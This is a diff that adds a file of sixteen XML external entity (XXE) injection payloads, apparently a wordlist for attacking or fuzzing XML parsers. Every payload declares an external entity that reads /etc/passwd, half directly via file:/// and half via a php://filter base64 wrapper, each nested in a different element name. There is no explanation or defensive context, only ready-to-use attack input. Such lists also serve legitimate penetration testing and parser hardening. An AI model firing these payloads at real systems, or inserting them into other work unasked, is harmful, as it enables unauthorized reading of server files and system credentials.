@@ -1,0 +1,128 @@
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<container>
+    <content>&file;</content>
+</container>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<section>
+    <text>&file;</text>
+</section>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<block>
+    <data>&file;</data>
+</block>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<parent>
+    <child>&file;</child>
+</parent>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<item>
+    <description>&file;</description>
+</item>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<entry>
+    <text>&file;</text>
+</entry>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<record>
+    <value>&file;</value>
+</record>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<container1>
+    <content>&file;</content>
+</container1>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<container>
+    <content>&file;</content>
+</container>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<section>
+    <text>&file;</text>
+</section>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<block>
+    <data>&file;</data>
+</block>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<parent>
+    <child>&file;</child>
+</parent>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<item>
+    <description>&file;</description>
+</item>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<entry>
+    <text>&file;</text>
+</entry>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<record>
+    <value>&file;</value>
+</record>
+
+<!DOCTYPE data [
+<!ELEMENT foo ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<container1>
+    <content>&file;</content>
+</container1>
+
